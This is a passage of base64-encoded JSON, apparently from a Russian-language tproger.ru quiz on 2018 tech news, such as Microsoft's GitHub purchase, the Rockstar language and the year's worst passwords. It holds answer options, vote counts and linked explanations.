hPiBcdTA0MzIgMjAxOCBcdTA0MzNcdTA0M2VcdTA0MzRcdTA0NDMuPFwvcD5cbiIsImNvcnJlY3QiOiIwIiwidm90ZWQiOiI5OSIsImZvcl9yZXN1bHQiOiItMSJ9LHsiaWQiOiIxODc4IiwicXVlc3Rpb25faWQiOiI1MzEiLCJ0ZXh0IjoiR29vZ2xlIiwiZGVzY3IiOiI8cD5cdTA0MTRcdTA0MzAhIFx1MDQxMlx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQ0N1x1MDQzNVx1MDQzYywgXHUwNDNlXHUwNDQyIFx1MDBhYkRvblx1MjAxOXQgYmUgZXZpbFx1MDBiYiBcdTA0M2FcdTA0M2VcdTA0M2NcdTA0M2ZcdTA0MzBcdTA0M2RcdTA0MzhcdTA0NGYgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9pcy1ldmlsLW9rLW5vd1wvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDQzZlx1MDQzZVx1MDQ0N1x1MDQ0Mlx1MDQzOCBcdTA0M2VcdTA0NDJcdTA0M2FcdTA0MzBcdTA0MzdcdTA0MzBcdTA0M2JcdTA0MzBcdTA0NDFcdTA0NGM8XC9hPiBcdTA0MzIgMjAxOCBcdTA0MzNcdTA0M2VcdTA0MzRcdTA0NDMuPFwvcD5cbiIsImNvcnJlY3QiOiIxIiwidm90ZWQiOiI3NTMiLCJmb3JfcmVzdWx0IjoiLTEifSx7ImlkIjoiMTg3OSIsInF1ZXN0aW9uX2lkIjoiNTMxIiwidGV4dCI6IlRvc2hpYmEiLCJkZXNjciI6IjxwPlx1MDQxZFx1MDQzNVx1MDQ0MiwgXHUwNDM0XHUwNDM1XHUwNDMyXHUwNDM4XHUwNDM3IFRvc2hpYmE6IFx1MDBhYkluIHRvdWNoIHdpdGggdG9tb3Jyb3dcdTAwYmIuIFx1MDQxMCBcdTA0MzJcdTA0M2VcdTA0NDIgXHUwNDQzIEdvb2dsZSBcdTA0M2FcdTA0MzBcdTA0M2EgXHUwNDQwXHUwNDMwXHUwNDM3IFx1MDQ0Mlx1MDQzMFx1MDQzYVx1MDQzOFx1MDQzNSBcdTA0NDFcdTA0M2JcdTA0M2VcdTA0MzNcdTA0MzBcdTA0M2RcdTA0NGIuIFx1MDQxMlx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQ0N1x1MDQzNVx1MDQzYywgXHUwNDNlXHUwNDQyIFx1MDBhYkRvblx1MjAxOXQgYmUgZXZpbFx1MDBiYiBcdTA0M2FcdTA0M2VcdTA0M2NcdTA0M2ZcdTA0MzBcdTA0M2RcdTA0MzhcdTA0NGYgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9pcy1ldmlsLW9rLW5vd1wvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDQzZlx1MDQzZVx1MDQ0N1x1MDQ0Mlx1MDQzOCBcdTA0M2VcdTA0NDJcdTA0M2FcdTA0MzBcdTA0MzdcdTA0MzBcdTA0M2JcdTA0MzBcdTA0NDFcdTA0NGM8XC9hPiBcdTA0MzIgMjAxOCBcdTA0MzNcdTA0M2VcdTA0MzRcdTA0NDMuPFwvcD5cbiIsImNvcnJlY3QiOiIwIiwidm90ZWQiOiIzMTAiLCJmb3JfcmVzdWx0IjoiLTEifSx7ImlkIjoiMTkwNSIsInF1ZXN0aW9uX2lkIjoiNTMxIiwidGV4dCI6IklCTSIsImRlc2NyIjoiPHA+XHUwNDFkXHUwNDM1XHUwNDQyLCBcdTA0MzRcdTA0MzVcdTA0MzJcdTA0MzhcdTA0MzcgSUJNOiBcdTAwYWJUaGlua1x1MDBiYi4gXHUwNDEwIFx1MDQzMlx1MDQzZVx1MDQ0MiBcdTA0NDMgR29vZ2xlIFx1MDQzYVx1MDQzMFx1MDQzYSBcdTA0NDBcdTA0MzBcdTA0MzcgXHUwNDQyXHUwNDMwXHUwNDNhXHUwNDM4XHUwNDM1IFx1MDQ0MVx1MDQzYlx1MDQzZVx1MDQzM1x1MDQzMFx1MDQzZFx1MDQ0Yi4gXHUwNDEyXHUwNDNmXHUwNDQwXHUwNDNlXHUwNDQ3XHUwNDM1XHUwNDNjLCBcdTA0M2VcdTA0NDIgXHUwMGFiRG9uXHUyMDE5dCBiZSBldmlsXHUwMGJiIFx1MDQzYVx1MDQzZVx1MDQzY1x1MDQzZlx1MDQzMFx1MDQzZFx1MDQzOFx1MDQ0ZiA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL2lzLWV2aWwtb2stbm93XC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+XHUwNDNmXHUwNDNlXHUwNDQ3XHUwNDQyXHUwNDM4IFx1MDQzZVx1MDQ0Mlx1MDQzYVx1MDQzMFx1MDQzN1x1MDQzMFx1MDQzYlx1MDQzMFx1MDQ0MVx1MDQ0YzxcL2E+IFx1MDQzMiAyMDE4IFx1MDQzM1x1MDQzZVx1MDQzNFx1MDQ0My48XC9wPlxuIiwiY29ycmVjdCI6IjAiLCJ2b3RlZCI6IjMzMiIsImZvcl9yZXN1bHQiOiItMSJ9XX0seyJpZCI6IjUzMiIsInRleHQiOiI8cD5cdTA0MTdcdTA0MzAgXHUwNDNhXHUwNDMwXHUwNDNhXHUwNDQzXHUwNDRlIFx1MDQ0MVx1MDQ0M1x1MDQzY1x1MDQzY1x1MDQ0MyBNaWNyb3NvZnQgXHUwNDNhXHUwNDQzXHUwNDNmXHUwNDM4XHUwNDNiXHUwNDMwIEdpdEh1Yj88XC9wPlxuIiwicXVpel9pZCI6IjY0Iiwidm90ZWQiOiIxNDk2IiwiYW5zd2VyX3R5cGUiOiJjaXJjbGUiLCJhbnN3ZXJzIjpbeyJpZCI6IjE4ODEiLCJxdWVzdGlvbl9pZCI6IjUzMiIsInRleHQiOiJcdTA0MTdcdTA0MzAgNTAwIFx1MDQzY1x1MDQzYlx1MDQzZCAkIiwiZGVzY3IiOiI8cD5cdTA0MWRcdTA0NDMgXHUwNDQ3XHUwNDQyXHUwNDNlIFx1MDQzMlx1MDQ0Yi4uLiBPcGVuIHNvdXJjZSBcdTA0MzIgXHUwNDNmXHUwNDNlXHUwNDQxXHUwNDNiXHUwNDM1XHUwNDM0XHUwNDNkXHUwNDM1XHUwNDM1IFx1MDQzMlx1MDQ0MFx1MDQzNVx1MDQzY1x1MDQ0ZiBcdTA0MzFcdTA0NDNcdTA0NDBcdTA0M2RcdTA0M2UgXHUwNDQwXHUwNDMwXHUwNDM3XHUwNDMyXHUwNDM4XHUwNDMyXHUwNDMwXHUwNDM1XHUwNDQyXHUwNDQxXHUwNDRmLiBcdTA0MjFcdTA0NDJcdTA0M2VcdTA0MzhcdTA0M2NcdTA0M2VcdTA0NDFcdTA0NDJcdTA0NGMgR2l0SHViIFx1MjAxNCA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL21pY3Jvc29mdC1ib3VnaHQtZ2l0aHViXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+Nyw1IFx1MDQzY1x1MDQzYlx1MDQ0MFx1MDQzNCAkPFwvYT4uPFwvcD5cbiIsImNvcnJlY3QiOiIwIiwidm90ZWQiOiIxODEiLCJmb3JfcmVzdWx0IjoiLTEifSx7ImlkIjoiMTg4MiIsInF1ZXN0aW9uX2lkIjoiNTMyIiwidGV4dCI6Ilx1MDQxN1x1MDQzMCA3LDUgXHUwNDNjXHUwNDNiXHUwNDQwXHUwNDM0ICQiLCJkZXNjciI6IjxwPlx1MDQxNFx1MDQzMCwgXHUwNDM4XHUwNDNjXHUwNDM1XHUwNDNkXHUwNDNkXHUwNDNlIFx1MDQzN1x1MDQzMCBcdTA0NGRcdTA0NDJcdTA0NDMgXHUwNDQxXHUwNDQzXHUwNDNjXHUwNDNjXHUwNDQzIE1pY3Jvc29mdCBcdTA0MzggPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9taWNyb3NvZnQtYm91Z2h0LWdpdGh1YlwvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDQzYVx1MDQ0M1x1MDQzZlx1MDQzOFx1MDQzYlx1MDQzMDxcL2E+IEdpdEh1Yi48XC9wPlxuIiwiY29ycmVjdCI6IjEiLCJ2b3RlZCI6Ijc5OSIsImZvcl9yZXN1bHQiOiItMSJ9LHsiaWQiOiIxODg0IiwicXVlc3Rpb25faWQiOiI1MzIiLCJ0ZXh0IjoiXHUwNDE3XHUwNDMwIDgyNCBcdTA0M2NcdTA0M2JcdTA0NDBcdTA0MzQgJCIsImRlc2NyIjoiPHA+XHUwNDFkXHUwNDM1XHUwNDQyLiBcdTA0MWZcdTA0NDBcdTA0MzhcdTA0M2NcdTA0MzVcdTA0NDBcdTA0M2RcdTA0M2UgXHUwNDQxXHUwNDQyXHUwNDNlXHUwNDNiXHUwNDRjXHUwNDNhXHUwNDNlIFx1MDQ0MVx1MDQ0Mlx1MDQzZVx1MDQzOFx1MDQzYlx1MDQzMCBcdTA0MzJcdTA0NDFcdTA0NGYgTWljcm9zb2Z0IFx1MDQzMlx1MDQzNVx1MDQ0MVx1MDQzZFx1MDQzZVx1MDQzOSAyMDE4IFx1MDQzM1x1MDQzZVx1MDQzNFx1MDQzMC4gXHUwNDEwIFx1MDQ0MVx1MDQ0Mlx1MDQzZVx1MDQzOFx1MDQzY1x1MDQzZVx1MDQ0MVx1MDQ0Mlx1MDQ0YyBHaXRIdWIgXHUyMDE0IDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c1wvbWljcm9zb2Z0LWJvdWdodC1naXRodWJcL1wiIHRhcmdldD1cIl9ibGFua1wiIHJlbD1cIm5vZm9sbG93IG5vb3BlbmVyIG5vcmVmZXJyZXJcIj43LDUgXHUwNDNjXHUwNDNiXHUwNDQwXHUwNDM0ICQ8XC9hPi48XC9wPlxuIiwiY29ycmVjdCI6IjAiLCJ2b3RlZCI6IjEwOSIsImZvcl9yZXN1bHQiOiItMSJ9LHsiaWQiOiIxOTA2IiwicXVlc3Rpb25faWQiOiI1MzIiLCJ0ZXh0IjoiXHUwNDE3XHUwNDMwIDE1IFx1MDQzY1x1MDQzYlx1MDQ0MFx1MDQzNCAkIiwiZGVzY3IiOiI8cD5cdTA0MTJcdTA0M2VcdTA0MzdcdTA0M2NcdTA0M2VcdTA0MzZcdTA0M2RcdTA0M2UsIFx1MDQzYlx1MDQzNVx1MDQ0MiBcdTA0NDdcdTA0MzVcdTA0NDBcdTA0MzVcdTA0MzcgXHUwNDM0XHUwNDM1XHUwNDQxXHUwNDRmXHUwNDQyXHUwNDRjXHUyMDI2IFx1MDQxZFx1MDQzZSBcdTA0NDFcdTA0MzVcdTA0MzlcdTA0NDdcdTA0MzBcdTA0NDEgXHUwNDQxXHUwNDQyXHUwNDNlXHUwNDM4XHUwNDNjXHUwNDNlXHUwNDQxXHUwNDQyXHUwNDRjIEdpdEh1YiBcdTIwMTQgPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9taWNyb3NvZnQtYm91Z2h0LWdpdGh1YlwvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPjcsNSBcdTA0M2NcdTA0M2JcdTA0NDBcdTA0MzQgJDxcL2E+LjxcL3A+XG4iLCJjb3JyZWN0IjoiMCIsInZvdGVkIjoiNDA1IiwiZm9yX3Jlc3VsdCI6Ii0xIn1dfSx7ImlkIjoiNTMzIiwidGV4dCI6IjxwPlx1MDQxYVx1MDQzMFx1MDQzYVx1MDQzZVx1MDQzOSBcdTA0MzhcdTA0MzcgXHUwNDRkXHUwNDQyXHUwNDM4XHUwNDQ1IFx1MDQ0Zlx1MDQzN1x1MDQ0Ylx1MDQzYVx1MDQzZVx1MDQzMiBcdTA0M2ZcdTA0NDBcdTA0M2VcdTA0MzNcdTA0NDBcdTA0MzBcdTA0M2NcdTA0M2NcdTA0MzhcdTA0NDBcdTA0M2VcdTA0MzJcdTA0MzBcdTA0M2RcdTA0MzhcdTA0NGYgXHUwNDNmXHUwNDNlXHUwNDRmXHUwNDMyXHUwNDM4XHUwNDNiXHUwNDQxXHUwNDRmIFx1MDQzMiAyMDE4IFx1MDQzM1x1MDQzZVx1MDQzNFx1MDQ0Mz88XC9wPlxuIiwicXVpel9pZCI6IjY0Iiwidm90ZWQiOiIxNDk2IiwiYW5zd2VyX3R5cGUiOiJjaXJjbGUiLCJhbnN3ZXJzIjpbeyJpZCI6IjE4ODUiLCJxdWVzdGlvbl9pZCI6IjUzMyIsInRleHQiOiJEYXJ0IiwiZGVzY3IiOiI8cD5EYXJ0IFx1MDQzZlx1MDQzZVx1MDQ0Zlx1MDQzMlx1MDQzOFx1MDQzYlx1MDQ0MVx1MDQ0ZiBcdTA0MzIgMjAxMSBcdTA0MzNcdTA0M2VcdTA0MzRcdTA0NDMuIFx1MDQxMlx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQ0N1x1MDQzNVx1MDQzYywgXHUwNDMyIDIwMTggPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9kYXJ0LTItMFwvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPiBcdTA0MzJcdTA0NGJcdTA0NDhcdTA0MzVcdTA0M2I8XC9hPiBEYXJ0IDIuIFx1MDQxMCBcdTA0M2ZcdTA0NDBcdTA0MzBcdTA0MzJcdTA0MzhcdTA0M2JcdTA0NGNcdTA0M2RcdTA0NGJcdTA0MzkgXHUwNDNlXHUwNDQyXHUwNDMyXHUwNDM1XHUwNDQyIFx1MjAxNCA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL3Byb2dyYW1taW5nLWxhbmd1YWdlLXJvY2tzdGFyXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+Um9ja3N0YXI8XC9hPi4gXHUwNDJkXHUwNDQyXHUwNDNlIFx1MDQzNFx1MDQzOFx1MDQzZFx1MDQzMFx1MDQzY1x1MDQzOFx1MDQ0N1x1MDQzNVx1MDQ0MVx1MDQzYVx1MDQzOCBcdTA0NDJcdTA0MzhcdTA0M2ZcdTA0MzhcdTA0MzdcdTA0MzhcdTA0NDBcdTA0M2VcdTA0MzJcdTA0MzBcdTA0M2RcdTA0M2RcdTA0NGJcdTA0MzkgXHUwNDRmXHUwNDM3XHUwNDRiXHUwNDNhIFx1MDQzNFx1MDQzYlx1MDQ0ZiBcdTA0NDFcdTA0M2VcdTA0MzdcdTA0MzRcdTA0MzBcdTA0M2RcdTA0MzhcdTA0NGYgXHUwNDNmXHUwNDQwXHUwNDNlXHUwNDMzXHUwNDQwXHUwNDMwXHUwNDNjXHUwNDNjLCBcdTA0M2ZcdTA0M2VcdTA0NDVcdTA0M2VcdTA0MzZcdTA0MzhcdTA0NDUgXHUwNDNkXHUwNDMwIFx1MDQzZlx1MDQzNVx1MDQ0MVx1MDQzZFx1MDQzOCA4MC1cdTA0NDUgXHUwNDMzXHUwNDNlXHUwNDM0XHUwNDNlXHUwNDMyLiA8XC9wPlxuIiwiY29ycmVjdCI6IjAiLCJ2b3RlZCI6IjM1NCIsImZvcl9yZXN1bHQiOiItMSJ9LHsiaWQiOiIxODg2IiwicXVlc3Rpb25faWQiOiI1MzMiLCJ0ZXh0IjoiUm9ja3N0YXIiLCJkZXNjciI6IjxwPlx1MDQxNFx1MDQzMCwgXHUwNDNmXHUwNDQwXHUwNDNlXHUwNDMzXHUwNDQwXHUwNDMwXHUwNDNjXHUwNDNjXHUwNDM4XHUwNDQxXHUwNDQyIFx1MDQxNFx1MDQzOFx1MDQzYlx1MDQzMFx1MDQzZCBcdTA0MTFcdTA0MzhcdTA0NDJcdTA0NDJcdTA0MzggPGEgaHJlZj1cImh0dHBzOlwvXC90cHJvZ2VyLnJ1XC9uZXdzXC9wcm9ncmFtbWluZy1sYW5ndWFnZS1yb2Nrc3RhclwvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDQ0MFx1MDQzMFx1MDQzN1x1MDQ0MFx1MDQzMFx1MDQzMVx1MDQzZVx1MDQ0Mlx1MDQzMFx1MDQzYjxcL2E+IFx1MDQ0ZFx1MDQ0Mlx1MDQzZVx1MDQ0MiBcdTA0MzRcdTA0MzhcdTA0M2RcdTA0MzBcdTA0M2NcdTA0MzhcdTA0NDdcdTA0MzVcdTA0NDFcdTA0M2FcdTA0MzggXHUwNDQyXHUwNDM4XHUwNDNmXHUwNDM4XHUwNDM3XHUwNDM4XHUwNDQwXHUwNDNlXHUwNDMyXHUwNDMwXHUwNDNkXHUwNDNkXHUwNDRiXHUwNDM5IFx1MDQ0Zlx1MDQzN1x1MDQ0Ylx1MDQzYSBcdTA0MzRcdTA0M2JcdTA0NGYgXHUwNDQxXHUwNDNlXHUwNDM3XHUwNDM0XHUwNDMwXHUwNDNkXHUwNDM4XHUwNDRmIFx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQzM1x1MDQ0MFx1MDQzMFx1MDQzY1x1MDQzYywgXHUwNDNmXHUwNDNlXHUwNDQ1XHUwNDNlXHUwNDM2XHUwNDM4XHUwNDQ1IFx1MDQzZFx1MDQzMCBcdTA0M2ZcdTA0MzVcdTA0NDFcdTA0M2RcdTA0MzggODAtXHUwNDQ1IFx1MDQzM1x1MDQzZVx1MDQzNFx1MDQzZVx1MDQzMi4gXHUwNDFkXHUwNDM1IFx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQzM1x1MDQ0MFx1MDQzMFx1MDQzY1x1MDQzY1x1MDQzMCwgXHUwNDMwIFx1MDQzZlx1MDQzNVx1MDQ0MVx1MDQzZFx1MDQ0ZiE8XC9wPlxuIiwiY29ycmVjdCI6IjEiLCJ2b3RlZCI6IjY2OCIsImZvcl9yZXN1bHQiOiItMSJ9LHsiaWQiOiIxODg3IiwicXVlc3Rpb25faWQiOiI1MzMiLCJ0ZXh0IjoiTW90ZXMiLCJkZXNjciI6IjxwPlx1MDQyZFx1MDQ0Mlx1MDQzZVx1MDQ0MiBcdTA0NDdcdTA0NDNcdTA0MzRcdTA0MzVcdTA0NDFcdTA0M2RcdTA0NGJcdTA0MzkgXHUwNDRmXHUwNDM3XHUwNDRiXHUwNDNhIFx1MDQzNFx1MDQzYlx1MDQ0ZiBcdTA0M2ZcdTA0NDBcdTA0M2VcdTA0MzNcdTA0NDBcdTA0MzBcdTA0M2NcdTA0M2NcdTA0MzhcdTA0NDBcdTA0M2VcdTA0MzJcdTA0MzBcdTA0M2RcdTA0MzhcdTA0NGYgXHUwNDNkXHUwNDMwIFx1MDQ0ZFx1MDQzY1x1MDQzZVx1MDQzNFx1MDQzN1x1MDQzOCA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL2FydGljbGVzXC9tb3Rlcy1lbW9qaS1sYW5ndWFnZVwvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPlx1MDQzZlx1MDQzZVx1MDQ0Zlx1MDQzMlx1MDQzOFx1MDQzYlx1MDQ0MVx1MDQ0ZjxcL2E+IFx1MDQzMiAyMDE3IFx1MDQzM1x1MDQzZVx1MDQzNFx1MDQ0My4gXHUwNDEwIFx1MDQzMiAyMDE4IFx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQzM1x1MDQ0MFx1MDQzMFx1MDQzY1x1MDQzY1x1MDQzOFx1MDQ0MVx1MDQ0MiBcdTA0MTRcdTA0MzhcdTA0M2JcdTA0MzBcdTA0M2QgXHUwNDExXHUwNDM4XHUwNDQyXHUwNDQyXHUwNDM4IFx1MDQ0MFx1MDQzMFx1MDQzN1x1MDQ0MFx1MDQzMFx1MDQzMVx1MDQzZVx1MDQ0Mlx1MDQzMFx1MDQzYiA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL3Byb2dyYW1taW5nLWxhbmd1YWdlLXJvY2tzdGFyXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+Um9ja3N0YXI8XC9hPiBcdTIwMTQgXHUwNDM0XHUwNDM4XHUwNDNkXHUwNDMwXHUwNDNjXHUwNDM4XHUwNDQ3XHUwNDM1XHUwNDQxXHUwNDNhXHUwNDM4IFx1MDQ0Mlx1MDQzOFx1MDQzZlx1MDQzOFx1MDQzN1x1MDQzOFx1MDQ0MFx1MDQzZVx1MDQzMlx1MDQzMFx1MDQzZFx1MDQzZFx1MDQ0Ylx1MDQzOSBcdTA0NGZcdTA0MzdcdTA0NGJcdTA0M2EgXHUwNDM0XHUwNDNiXHUwNDRmIFx1MDQ0MVx1MDQzZVx1MDQzN1x1MDQzNFx1MDQzMFx1MDQzZFx1MDQzOFx1MDQ0ZiBcdTA0M2ZcdTA0NDBcdTA0M2VcdTA0MzNcdTA0NDBcdTA0MzBcdTA0M2NcdTA0M2MsIFx1MDQzZlx1MDQzZVx1MDQ0NVx1MDQzZVx1MDQzNlx1MDQzOFx1MDQ0NSBcdTA0M2RcdTA0MzAgXHUwNDNmXHUwNDM1XHUwNDQxXHUwNDNkXHUwNDM4IDgwLVx1MDQ0NSBcdTA0MzNcdTA0M2VcdTA0MzRcdTA0M2VcdTA0MzIuPFwvcD5cbiIsImNvcnJlY3QiOiIwIiwidm90ZWQiOiIyMjEiLCJmb3JfcmVzdWx0IjoiLTEifSx7ImlkIjoiMTkwNyIsInF1ZXN0aW9uX2lkIjoiNTMzIiwidGV4dCI6IlJpbmciLCJkZXNjciI6IjxwPlx1MDQxZFx1MDQzNVx1MDQ0MiwgXHUwNDRkXHUwNDQyXHUwNDNlXHUwNDQyIFx1MDQzY1x1MDQ0M1x1MDQzYlx1MDQ0Y1x1MDQ0Mlx1MDQzOFx1MDQzZlx1MDQzMFx1MDQ0MFx1MDQzMFx1MDQzNFx1MDQzOFx1MDQzM1x1MDQzY1x1MDQzMFx1MDQzYlx1MDQ0Y1x1MDQzZFx1MDQ0Ylx1MDQzOSBcdTA0NGZcdTA0MzdcdTA0NGJcdTA0M2EgXHUwNDQxIFx1MDQzNFx1MDQzOFx1MDQzZFx1MDQzMFx1MDQzY1x1MDQzOFx1MDQ0N1x1MDQzNVx1MDQ0MVx1MDQzYVx1MDQzZVx1MDQzOSBcdTA0NDJcdTA0MzhcdTA0M2ZcdTA0MzhcdTA0MzdcdTA0MzBcdTA0NDZcdTA0MzhcdTA0MzVcdTA0MzkgXHUwNDNmXHUwNDNlXHUwNDRmXHUwNDMyXHUwNDM4XHUwNDNiXHUwNDQxXHUwNDRmIFx1MDQzMiAyMDE2IFx1MDQzM1x1MDQzZVx1MDQzNFx1MDQ0My4gXHUwNDEwIFx1MDQzMiAyMDE4IFx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQzM1x1MDQ0MFx1MDQzMFx1MDQzY1x1MDQzY1x1MDQzOFx1MDQ0MVx1MDQ0MiBcdTA0MTRcdTA0MzhcdTA0M2JcdTA0MzBcdTA0M2QgXHUwNDExXHUwNDM4XHUwNDQyXHUwNDQyXHUwNDM4IFx1MDQ0MFx1MDQzMFx1MDQzN1x1MDQ0MFx1MDQzMFx1MDQzMVx1MDQzZVx1MDQ0Mlx1MDQzMFx1MDQzYiA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NcL3Byb2dyYW1taW5nLWxhbmd1YWdlLXJvY2tzdGFyXC9cIiB0YXJnZXQ9XCJfYmxhbmtcIiByZWw9XCJub2ZvbGxvdyBub29wZW5lciBub3JlZmVycmVyXCI+Um9ja3N0YXI8XC9hPiBcdTIwMTQgXHUwNDM0XHUwNDM4XHUwNDNkXHUwNDMwXHUwNDNjXHUwNDM4XHUwNDQ3XHUwNDM1XHUwNDQxXHUwNDNhXHUwNDM4IFx1MDQ0Mlx1MDQzOFx1MDQzZlx1MDQzOFx1MDQzN1x1MDQzOFx1MDQ0MFx1MDQzZVx1MDQzMlx1MDQzMFx1MDQzZFx1MDQzZFx1MDQ0Ylx1MDQzOSBcdTA0NGZcdTA0MzdcdTA0NGJcdTA0M2EgXHUwNDM0XHUwNDNiXHUwNDRmIFx1MDQ0MVx1MDQzZVx1MDQzN1x1MDQzNFx1MDQzMFx1MDQzZFx1MDQzOFx1MDQ0ZiBcdTA0M2ZcdTA0NDBcdTA0M2VcdTA0MzNcdTA0NDBcdTA0MzBcdTA0M2NcdTA0M2MsIFx1MDQzZlx1MDQzZVx1MDQ0NVx1MDQzZVx1MDQzNlx1MDQzOFx1MDQ0NSBcdTA0M2RcdTA0MzAgXHUwNDNmXHUwNDM1XHUwNDQxXHUwNDNkXHUwNDM4IDgwLVx1MDQ0NSBcdTA0MzNcdTA0M2VcdTA0MzRcdTA0M2VcdTA0MzIuPFwvcD5cbiIsImNvcnJlY3QiOiIwIiwidm90ZWQiOiIyNTIiLCJmb3JfcmVzdWx0IjoiLTEifV19LHsiaWQiOiI1MzQiLCJ0ZXh0IjoiPHA+XHUwNDFhXHUwNDMwXHUwNDNhXHUwNDNlXHUwNDM5IFx1MDQzOFx1MDQzNyBcdTA0NGRcdTA0NDJcdTA0MzhcdTA0NDUgXHUwNDNmXHUwNDMwXHUwNDQwXHUwNDNlXHUwNDNiXHUwNDM1XHUwNDM5IFx1MDQzOFx1MDQ0MVx1MDQzZlx1MDQzZVx1MDQzYlx1MDQ0Y1x1MDQzN1x1MDQ0M1x1MDQ0ZVx1MDQ0MiBcdTA0NDBcdTA0MzVcdTA0MzZcdTA0MzUgXHUwNDNlXHUwNDQxXHUwNDQyXHUwNDMwXHUwNDNiXHUwNDRjXHUwNDNkXHUwNDRiXHUwNDQ1PzxcL3A+XG4iLCJxdWl6X2lkIjoiNjQiLCJ2b3RlZCI6IjE0OTYiLCJhbnN3ZXJfdHlwZSI6ImNpcmNsZSIsImFuc3dlcnMiOlt7ImlkIjoiMTg4OSIsInF1ZXN0aW9uX2lkIjoiNTM0IiwidGV4dCI6InF3ZXJ0eSIsImRlc2NyIjoiPHA+XHUwNDFlXHUwNDQ3XHUwNDM1XHUwNDNkXHUwNDRjIFx1MDQzMVx1MDQzYlx1MDQzOFx1MDQzN1x1MDQzYVx1MDQzZSEgXHUwNDE3XHUwNDMwXHUwNDNkXHUwNDM4XHUwNDNjXHUwNDMwXHUwNDM1XHUwNDQyIDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c1wvdG9wLTEwMC13b3JzdC1wYXNzd29yZHMtMjAxOFwvXCIgdGFyZ2V0PVwiX2JsYW5rXCIgcmVsPVwibm9mb2xsb3cgbm9vcGVuZXIgbm9yZWZlcnJlclwiPiBcdTA0MzRcdTA0MzVcdTA0MzJcdTA0NGZcdTA0NDJcdTA0M2VcdTA0MzUgXHUwNDNjXHUwNDM1XHUwNDQxXHUwNDQyXHUwNDNlPFwvYT4gXHUwNDMyIFx1MDQ0MFx1MDQzNVx1MDQzOVx1MDQ0Mlx1MDQzOFx1MDQzZFx1MDQzM1x1MDQzNSBcdTA0NDVcdTA0NDNcdTA0MzRcdTA0NDhcdTA0MzhcdTA0NDUgXHUwNDNmXHUwNDMwXHUwNDQwXHUwNDNlXHUwNDNiXHUwNDM1XHUwNDM5IDIwMTggXHUwNDMzXHUwNDNlXHUwNDM0XHUwNDMwLiBcdTA0MTAgXHUwNDM4XHUwNDM3IFx1MDQzZlx1MDQzNVx1MDQ0MFx1MDQzNVx1MDQ0N1x1MDQzOFx1MDQ0MVx1MDQzYlx1MDQzNVx1MDQzZFx1MDQzZFx1MDQ0Ylx1MDQ0NSBcdTA0M2ZcdTA0MzBcdTA0NDBcdTA0M2VcdTA0M2JcdTA0MzVcdTA0MzkgXHUwNDQwXHUwNDM1XHUwNDM2XHUwNDM1IFx1MDQzZVx1MDQ0MVx1MDQ0Mlx1MDQzMFx1MDQzYlx1MDQ0Y1x1MDQzZFx1MDQ0Ylx1MDQ0NSBcdTA0MzhcdTA0NDFcdTA0M2ZcdTA0M2VcdTA0M2JcdTA0NGNcdTA0MzdcdTA0NDNcdTA0NGVcdTA0NDIgXHUwMGFiaWxvdmV5b3VcdTAwYmIuIFx1MDQxZVx1MDQzZCBcdTA0MzdcdTA0MzBcdTA0M2RcdTA0MzhcdTA0M2NcdTA0MzBcdTA0MzVcdTA0NDIgXHUwNDM0XHUwNDM1XHUwNDQxXHUwNDRmXHUwNDQyXHUwNDQzXHUwNDRlIFx1MDQ0MVx1MDQ0Mlx1MDQ0MFx1MDQzZVx1MDQ0N1x1MDQzYVx1MDQ0MyBcdTA0NDBcdTA0MzVcdTA0MzlcdTA0NDJcdTA0MzhcdTA0M2RcdTA0MzNcdTA0MzAuPFwvcD5cb